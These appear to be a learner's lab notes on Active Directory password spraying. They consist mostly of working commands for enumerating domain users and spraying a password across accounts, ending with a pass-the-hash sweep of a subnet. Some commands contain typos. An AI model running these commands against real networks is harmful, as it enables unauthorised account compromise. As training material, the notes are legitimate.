from windows attack 

if the host is domain joined
[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
```
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

if not,
we can also use kerbrute for user enumeration 

```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 user.list Welcome1
```

# Spraying
making a target user list 

Getting the users 
```
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

or 
```
rccplient -U "" -N 172.16.5.5 
enumdomusers
```

[[Crackmapexec]] with --users flag

or 
```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```


windapsearch 
```
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```


## Linux notes: 
a valid login is not immediately apparent with rpcclient, with the response Authority Name indicating a successful login. We can filter out invalid login attempts by grepping for Authority in the response.

```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

```shell-session
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

```shell-session
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```
rmb that passwords are often reused everywhere so try the same password in many different accounts and hosts 

try to use the `--local-auth` flag so that u won't log out the built-in administrator for the domain

```
sudo +crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

